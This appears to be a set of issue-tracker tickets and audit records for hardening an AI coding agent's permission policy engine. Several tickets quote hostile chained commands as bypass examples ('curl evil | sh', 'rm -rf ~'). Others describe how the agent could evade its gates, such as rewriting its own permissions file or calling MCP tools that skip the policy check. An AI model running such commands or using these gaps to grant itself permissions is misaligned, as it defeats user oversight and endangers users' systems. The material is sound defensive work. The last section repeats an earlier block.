title: Default write:'**/*' allow lets the agent self-grant permissions by rewriting permissions.yaml
description: With the fork's restricted=true default, the policy engine gates shell commands -- but the default policy still allows writes to '**/*', including ~/.forge/permissions.yaml and ~/.forge/.forge.toml themselves. An agent that wants unrestricted command execution can simply write an allow rule (or restricted=false) with the Write tool and never see a prompt. Confirmed by adversarial review 2026-08-21 (epic forgecode-shell-policy-hardening-dt8). Fix direction: deny (or confirm) writes to the config/permissions paths specifically -- a Deny rule for the forge base path in permissions.default.yaml is the cheapest version, since Deny wins over Allow in the engine. Needs a test that a Write op targeting the permissions path is denied while ordinary writes stay allowed.

title: Revisit: monty codemode tool for Forge (deferred until monty V1 + pydantic-ai codemode settles)
description: Revisit conditions and preserved integration analysis: see forgecode-monty-harvest-decision-uzi. Do not start before: monty >=0.1/V1 stable API, pydantic-ai codemode shipped and settled, and a per-external-call permission design exists for Forge.

title: Decision: monty harvest audit - verdict: do not harvest
description:
# Decision: do NOT harvest code from ~/mysrc/monty (pydantic/monty) into forgecode mymain

Audit date: 2026-08-21. Method: two independent reviewer agents (advocate-verifier + skeptic), unanimous convergence. Same protocol and bar ("100% useful and value-adding") as the rust-bash audit (forgecode-rust-bash-harvest-decision-9mb).

## Verdicts
1. **codemode "python" tool (monty crate dep, Forge tools as external functions): REJECTED (both agents, high confidence).**
   - Architecture conflict: Forge gates permissions per tool call BEFORE execution (crates/forge_app/src/tool_registry.rs:64-91,140-151; PermissionOperation mapping at forge_domain/src/tools/catalog.rs:926). A monty program pausing at RunProgress::FunctionCall (monty/crates/monty/src/run_progress.rs:109-186) would either bypass the policy engine for LLM-authored programs chaining read/patch/shell, or require interactive permission prompts mid-suspended-interpreter with no rollback for already-executed statements.
   - Redundant: the agent already composes operations via the policy-gated shell tool with FULL Python/jq/pipes; monty offers a strict Python SUBSET (30+ documented CPython divergences in monty/limitations/).
   - Premature: experimental v0.0.21, 16 lockstep crates, DUMP_VERSION already at 5, architectural breaks within single release cycles (#500 subprocess pool, #576 fs split, #692 dump collapse); supported path spawns a separate `monty` worker binary Forge would have to ship; monty workspace lock = 569 packages incl. six ruff_* crates pinned at fragile 0.0.3.
   - Positioning: monty is pydantic-ai's codemode substrate; a matured ecosystem integration will likely supersede any fork-side early adoption.
   - For a future attempt, integration points and feasibility notes are preserved in this ticket's audit trail: MontyRun::start (monty/src/run.rs:148) resumable state machine IS embeddable and Send; would slot as ToolCatalog variant (catalog.rs:41-59) + tool_executor match arm (~:157) + policy mapping (catalog.rs:926). Effort L (minimal) to XL (mid-run prompts + async parallelism).
2. **Pattern harvests: ALL REJECTED.** Resource limits (monty-types/src/resource.rs:162) are interpreter-loop fuel checks — Forge tools are I/O-bound, already bounded by tokio timeout (tool_registry.rs:45-61). monty-pool amortizes interpreter-worker subprocess spawn — Forge has none. Snapshot/resume rejects on every DUMP_VERSION bump and Forge's conversation state is already plain serde data + forge_snaps for files.
3. **Noteworthy idea, still skipped:** monty-fs capability-based FS (cap-std Dir descriptors opened at mount time = OS-enforced path confinement, no TOCTOU) vs Forge's in-process string path checks. Wrong threat model for Forge's user-approval design and would rearchitect upstream-owned FS services. Filed as idea only, no action.
4. **Non-blocker for the record:** toolchain is compatible (monty MSRV 1.95, forge pins 1.97, both edition 2024). Rejection is architectural/maturity-based, not technical impossibility.

## Revisit trigger (see deferred ticket)
Reconsider when ALL hold: monty >= ~0.1/V1 with API stability commitment; pydantic-ai has shipped a settled codemode pattern; and Forge (upstream or fork) has a designed answer for per-external-call permission enforcement.
close_reason: Decision record: unanimous two-agent audit, do not harvest from monty

title: MCP and Task/Skill tool calls bypass the policy engine entirely
description: crates/forge_app/src/tool_registry.rs runs check_tool_permission only inside the ToolCatalog branch; the mcp_executor branch (~line 186) executes MCP tools via McpExecutor::execute with no policy consultation at all. Several ToolCatalog variants (Task/Skill/SemSearch/Undo) also have no to_policy_operation mapping, so they are never checked. With the fork now defaulting to restricted=true this matters more: users will reasonably assume 'restricted' covers every tool. Either route MCP calls through the policy engine (needs an operation mapping for MCP server/tool identity) or document the gap explicitly in docs/fork-differences.md. Confirmed by adversarial review 2026-08-21 (epic forgecode-shell-policy-hardening-dt8).

title: STRETCH: AST-based executable extraction via brush-parser/tree-sitter (not rust-bash)
description:
STRETCH (only after T1+T2 land): AST-based executable extraction for Execute policy checks.

Parse the command with a direct crates.io dep — `brush-parser` (the same parser rust-bash wraps; do NOT dep on rust-bash) or `tree-sitter-bash` — walk pipelines, `;`/`&&`/`||`, subshells and `$()` word-substitutions, extract every invoked executable, and run policy matching per simple command instead of on the raw string. Integration: split PermissionOperation::Execute at crates/forge_domain/src/tools/catalog.rs:998 (to_policy_operation) or inside PolicyEngine::can_perform (crates/forge_domain/src/policies/engine.rs:24).

Preconditions: T1 and T2 closed; upstream branches checked (fix/policy-most-specific-wins, accept-or-reject-command-exec) — if upstream is landing an equivalent, prefer adopting theirs. Skip-and-close-with-reason is an acceptable outcome.
Effort M. Tests: table-driven extraction tests incl. quoting, substitution, subshell nesting.
close_reason: Implemented via tree-sitter-bash (direct dep, not rust-bash): new forge_services/src/command_extract.rs evaluates Execute policy per simple command; upstream branches checked (no equivalent in flight); 8 new tests; just ci green

title: Flip default permission posture (restricted + default policy)
description:
Decide and flip the fork's default permission posture.

Today the policy engine is effectively off: (a) `restricted` defaults to false (crates/forge_config/src/config.rs:272-273 #[serde(default)]) and the engine is only consulted when restricted=true (crates/forge_app/src/tool_registry.rs:142-143); (b) even when on, crates/forge_services/src/permissions.default.yaml is allow-everything (`command: "*"`, `url: "*"`, read/write `**/*`).

Work: pick the fork's posture (e.g. restricted=true by default with a confirm-not-deny default policy for commands, keep read allow-all), implement, and document in the fork docs. This is ~90% of the practical safety win at a few-line cost. Must be checked against upstream branch `upstream/permissions-config` first to avoid divergence.
Tests: config default test + one end-to-end policy-consulted test.
close_reason: Flipped: restricted=true in embedded .forge.toml defaults; permissions.default.yaml commands/urls now confirm (reads/writes allow); config-default + default-policy engine tests added; documented in fork-differences.md; just ci green (2783 tests)

title: Fix Accept-and-Remember Execute-rule glob bypass
description:
Fix the "Accept and Remember" Execute-rule glob bypass.

Today: accepting-and-remembering `git push origin main` creates policy glob `git push*` (crates/forge_services/src/policy.rs:259-263, create_policy_for_operation). Rule::matches then glob-matches the RAW full command string (crates/forge_domain/src/policies/rule.rs:79-86), so the remembered rule also allows `git push; curl evil | sh` or `git push && rm -rf ~`.

Fix direction (choose the least upstream-conflicting): make remembered Execute rules exact-match the command string, OR keep the glob but refuse auto-match when the candidate command contains shell metacharacters (; | & $( ` > <) outside quotes — `shell-words`/`shlex` are already in Cargo.lock transitively if tokenization is needed; prefer adding an explicit direct dep if used.
Tests: bypass regression test (remembered `git push*` must NOT match `git push; evil`), plus existing policy tests stay green.
close_reason: Fixed: remembered Execute rules now glob-escaped exact-match (forge_services/src/policy.rs); regression tests prove 'git push origin main' rule no longer matches compound-command bypasses; just ci green (2781 tests)

title: Fix remembered Fetch rules: bare-host pattern never matches a full URL
description: create_policy_for_operation stores Fetch remember-rules as format!("{host}*") (crates/forge_services/src/policy.rs, e.g. 'example.com*'), but Rule::matches globs that pattern against the FULL url string ('https://example.com/api'), which can never match: the pattern lacks the scheme and glob '*' does not cross '/'. Net effect: 'Accept and Remember' for URL fetches is a permanent no-op -- the user is re-prompted forever. Confirmed by adversarial review 2026-08-21 (epic forgecode-shell-policy-hardening-dt8), out of that epic's scope. Fix needs a pattern that matches the origin without also matching suffix-hijacks like example.com.evil.com; check glob crate '*' vs '/' semantics and add a round-trip test. Note the fork's default policy no longer ships a url catch-all, so this is now user-visible.

title: Decision: rust-bash harvest audit - verdict: do not harvest
description:
# Decision: do NOT harvest code from ~/mysrc/rust-bash into forgecode mymain

Audit date: 2026-08-21. Method: two independent reviewer agents (advocate-verifier + skeptic), unanimous convergence. Bar was "100% useful and value-adding"; no harvest candidate met it.

## Verdicts
1. **parser-for-policy (rust-bash as crate dep): REJECTED.** rust-bash has no parser of its own — `rust_bash::interpreter::parse` (src/interpreter/mod.rs:564) returns `brush_parser::ast::Program` from a *git-rev-pinned* brush-parser (rust-bash Cargo.toml:42), and the dep would drag jaq, ureq, tar, flate2, chrono-tz, similar, rustyline, clap into Forge's lockfile. If AST extraction is ever wanted: depend on crates.io `brush-parser` (0.4.0) or `tree-sitter-bash` directly.
2. **OverlayFs dry-run/preview shell mode: REJECTED.** rust-bash cannot exec real binaries; a coding agent's risky commands are overwhelmingly real binaries (git/cargo/npm/docker), so a preview either fails on everything or silently diverges from real execution = false sense of safety. File-mutation risk is already covered by forge_snaps (crates/forge_snaps/src/service.rs + fs_undo). Integration point shell.rs is the hottest upstream-churn file (22 commits/yr) — max merge friction.
3. **Everything else (NetworkPolicy, ExecutionLimits, mcp.rs, pure-Rust coreutils, repo tooling): REJECTED.** Redundant with Forge's Fetch rules, inapplicable to a real-subprocess executor, wrong direction (MCP server vs client), or useless without adopting the whole interpreter.

## Real findings the audit produced (tracked in epic: shell-policy-hardening)
The genuine gap is Forge's permission *posture*, not parsing:
- `restricted` defaults to false (crates/forge_config/src/config.rs:272-273); policy engine only consulted when restricted (crates/forge_app/src/tool_registry.rs:142-143).
- Default policy is allow-everything: `command: "*"` (crates/forge_services/src/permissions.default.yaml).
- "Accept and Remember" on `git push origin main` creates glob `git push*` (crates/forge_services/src/policy.rs:259-263) which then matches `git push; curl evil | sh` (crates/forge_domain/src/policies/rule.rs:79-86).
- Stale rustdoc on ForgeShell (crates/forge_services/src/tool_services/shell.rs:15-20) advertises a nonexistent restricted mode / '-u' flag (dead since PR #913); inert (LLM sees descriptions/shell.md) — fix belongs upstream, not in the fork.
- Upstream has in-flight unmerged branches touching this exact area: fix/policy-most-specific-wins, accept-or-reject-command-exec, permissions-config — any fork work must check these first.
close_reason: Decision record: unanimous two-agent audit, do not harvest; follow-up tracked in forgecode-shell-policy-hardening-dt8

title: Evaluate proven Rust harvests for Forge
description:
Recon found three bounded candidates worth validating before any Forge source change: Atuin MCP integration, repository-ancestor instruction discovery, and Autoloop-style evaluation. Every child remains gated by measured benefit, existing Forge overlap, source-control hygiene, and license/provenance review. Full evidence: ~/reports/forgecode-rust-harvest-recon-2026-08-21.md.

## Success Criteria

- Each child produces an evidence-backed adopt, adapt, or reject verdict.
- No source copying without clean provenance, license review, GitNexus impact analysis, regression tests, and `just ci`.
- Rejected candidates add no Forge dependency or code surface.
acceptance_criteria: Each child yields evidence-backed adopt/adapt/reject verdict; no source is copied without clean provenance, license review, impact analysis, regression tests, and just ci.

title: Dogfood Atuin history/output MCP through Forge
description:
Dogfood Atuin as external shell-memory service through Forge existing stdio MCP support. Atuin already exposes read-only atuin_history and atuin_output tools with workspace/session/author/failure filters (~/mysrc/atuin/crates/atuin-ai/src/mcp.rs:1-9,94-195). Forge already accepts stdio MCP servers (crates/forge_domain/src/mcp.rs:21-84) and manages trusted MCP tools (crates/forge_services/src/mcp/service.rs:103-193). Do not copy Atuin database, daemon, fuzzy index, or PTY proxy.

## Acceptance Criteria

- Run at least 30 representative history queries across workspace, directory, failure, user, and agent filters.
- Record median latency, relevance, tool failures, secret-filter observations, and output availability.
- Finish with a native-code-needed yes/no verdict. Default: no Forge code.
acceptance_criteria: Run at least 30 representative history queries across workspace, directory, failure, user, and agent filters; record median latency, relevance, tool failures, secret-filter observations, and output availability. Finish with native-code-needed yes/no verdict. Default: no Forge code.

title: Load repository-ancestor AGENTS.md files inside git root
description:
Forge instruction discovery currently checks global, git-root, exact cwd, and extra paths, missing AGENTS.md files in intermediate repository subdirectories (crates/forge_services/src/instructions.rs:6-24,35-70,91-153). Atuin provides a bounded root-to-cwd ancestor walker with cache invalidation (~/mysrc/atuin/crates/atuin-ai/src/user_context/walker.rs:1-7,28-70; user_context/mod.rs:1-8,37-81). Implement Forge-native deterministic ancestor discovery only inside proven repository boundary. Reject Atuin command interpolation.

## Acceptance Criteria

- Run GitNexus impact analysis before edits.
- Test root, cwd, intermediate precedence, nested git/worktree boundaries, deduplication, symlink escape rejection, missing files, size limits, and cache invalidation.
- Add no shell interpolation.
- `just ci` passes.
acceptance_criteria: Impact analysis completed before edits. Tests cover root/cwd/intermediate precedence, nested git/worktree boundaries, deduplication, symlink escape rejection, missing files, size limits, and cache invalidation. No shell interpolation. just ci passes.

title: Prove Autoloop evaluation kernel value before selective port
description:
Autoloop contains a compact evaluation kernel absent from Forge core: command timeout/capture, line/JSON/regex metric extraction, retries, baseline delta, confidence, guardrails, and explicit verdicts (~/mysrc/autoloop/src/eval/mod.rs:55-180; formats.rs:7-70; confidence.rs:1-40; guardrails.rs:4-35). First run an external dogfood comparison. Port only proven Forge-native pieces; never vendor whole project. Current Autoloop checkout is dirty and locally ahead, so no copying until provenance and branch state are resolved.

## Acceptance Criteria

- Compare external Autoloop evaluation against current Forge benchmark/verification flow on at least 10 representative changes.
- Record determinism, flaky-run handling, timeout behavior, metric formats, and operator effort.
- Produce a selective port plan only if measurable benefit and a clean ownership boundary are proven.
acceptance_criteria: Compare external Autoloop evaluation against current Forge benchmark/verification flow on at least 10 representative changes. Record determinism, flaky-run handling, timeout behavior, metric formats, and operator effort. Port plan only if measurable benefit and clean ownership boundary are proven.

title: Per-simple-command policy matching is disabled on Windows
description: command_extract.rs evaluate_execute_permission early-returns the raw glob verdict under cfg!(windows), because the tree-sitter-bash grammar does not describe cmd.exe syntax. But the bypass being closed is live there too: cmd.exe chains with &, && and |, and COMSPEC may point at PowerShell (; chaining), so a rule like 'git *' still auto-allows 'git status & curl evil' on Windows. Options: a cmd.exe/PowerShell-aware splitter, or fail closed (Confirm) for Windows command strings containing chaining metacharacters outside quotes -- the latter is cheap and safe. Confirmed by adversarial review 2026-08-21 (epic forgecode-shell-policy-hardening-dt8).

title: Ultracode: shell-command permission hardening (from rust-bash audit)
description:
# Ultracode session runbook: shell-command permission hardening

Origin: rust-bash harvest audit 2026-08-21 (see forgecode-rust-bash-harvest-decision-9mb — verdict was DO NOT HARVEST; this epic is the fork-side work the audit surfaced instead. No rust-bash code is involved.)

## How to execute (new, empty conversation)
1. Start the session with the keyword **ultracode** and: "execute br epic forgecode-shell-policy-hardening" (or this epic's actual ID).
2. First action: `br show` this epic and all child tickets; `br ready` for ordering (deps encode it).
3. Phase the work as separate workflows, staying in the loop between them: understand -> implement (per ticket) -> adversarial review of the diff. Child tickets carry exact file:line anchors — verify each anchor against current code before editing (upstream merges may have moved things).
4. Budget discipline: these are small, surgical changes; do not fan out wide. A handful of agents per phase suffices. Verification (tests + adversarial diff review) is where to spend depth.
5. Before ANY change in forge_domain/src/policies/ or forge_services/src/policy.rs: check upstream in-flight branches `upstream/fix/policy-most-specific-wins`, `upstream/accept-or-reject-command-exec`, `upstream/permissions-config` (git fetch upstream first) and prefer designs that will not conflict semantically.
6. Definition of done per ticket: change + covering test + `just` verification gate green + ticket closed via `br close` with a one-line evidence note. Commit per ticket, fork commit style (see git log on mymain).

title: Upstream PR: remove stale ForgeShell restricted-mode rustdoc
description: Upstream PR (NOT a fork-local patch): remove/rewrite the stale ForgeShell rustdoc at crates/forge_services/src/tool_services/shell.rs:15-20, which advertises a nonexistent restricted mode and '-u' flag (dead since upstream PR #913; no such flag in forge_main/src/cli.rs). The comment is inert (LLM-facing description is forge_domain/src/tools/descriptions/shell.md) — as a fork diff it is merge-conflict bait on a 22-commits/yr file with zero payoff, so it only makes sense upstream. 5-line change against upstream main via gh.

title: Remembered execute rules apply in every directory (dir: None)
description: create_policy_for_operation is called with dir=None at forge_services/src/policy.rs:68, so an Accept-and-Remember rule is global: a command remembered while working in a trusted repo auto-allows the byte-identical command in any other checkout, including an attacker-supplied one. Remembered commands are typically project-scoped ('just ci', 'cargo test', './scripts/build.sh'), which makes the mismatch meaningful -- './scripts/build.sh' means something different in a hostile repo. The ExecuteRule already has a dir field and Rule::matches enforces it. Fix: pass the operation's cwd (or its project root) as dir when remembering, ideally offering the user the choice. Note upstream/permissions-config deletes create_policy_for_operation entirely, so check that branch first. Confirmed by adversarial review 2026-08-21.

title: Guard against the permissions.default.yaml catch-all shadowing regression
description: The fork's default policy deliberately expresses 'confirm' as the ABSENCE of a rule, because PolicyEngine::evaluate_policy_set returns the first matching Deny/Confirm and discards any Allow already seen -- so a confirm catch-all shadows every allow rule (including Accept-and-Remember). This is documented in permissions.default.yaml and docs/fork-differences.md and covered by test_remembered_rules_take_effect_under_default_policies. If upstream/fix/policy-most-specific-wins lands, its specificity scoring makes catch-alls safe again and this constraint can be revisited. Track so the reasoning is not lost on the next merge.

title: restricted=true default is inert for existing installs (config writer pins restricted=false)
description: The fork's restricted=true embedded default (crates/forge_config/.forge.toml) never takes effect on any install whose ~/forge/.forge.toml (or ~/.forge/.forge.toml) was written by an earlier version: ForgeConfig::write via ConfigWriter materialises EVERY field including 'restricted = false', and read_global() is layered AFTER read_defaults(), so the stale value wins. forge_infra/src/env.rs update_environment re-writes the full dump on every config change (e.g. /model), re-pinning it. Verified live on this machine: effective restricted=false while read_defaults() alone yields true; /Users/milan.santosi/forge/.forge.toml:30 has 'restricted = false'. Net: the entire shell-policy-hardening epic is switched off for existing users while docs say otherwise. Fix options: (a) ConfigWriter skips fields equal to the embedded default, (b) one-time migration that removes a restricted=false line written before the flip, (c) startup warning when effective restricted is false but defaults say true. (a) is the general fix and also stops every future default flip from being silently frozen. Confirmed by adversarial review 2026-08-21.

## Real findings the audit produced (tracked in epic: shell-policy-hardening)
The genuine gap is Forge's permission *posture*, not parsing:
- `restricted` defaults to false (crates/forge_config/src/config.rs:272-273); policy engine only consulted when restricted (crates/forge_app/src/tool_registry.rs:142-143).
- Default policy is allow-everything: `command: "*"` (crates/forge_services/src/permissions.default.yaml).
- "Accept and Remember" on `git push origin main` creates glob `git push*` (crates/forge_services/src/policy.rs:259-263) which then matches `git push; curl evil | sh` (crates/forge_domain/src/policies/rule.rs:79-86).
- Stale rustdoc on ForgeShell (crates/forge_services/src/tool_services/shell.rs:15-20) advertises a nonexistent restricted mode / '-u' flag (dead since PR #913); inert (LLM sees descriptions/shell.md) — fix belongs upstream, not in the fork.
- Upstream has in-flight unmerged branches touching this exact area: fix/policy-most-specific-wins, accept-or-reject-command-exec, permissions-config — any fork work must check these first.
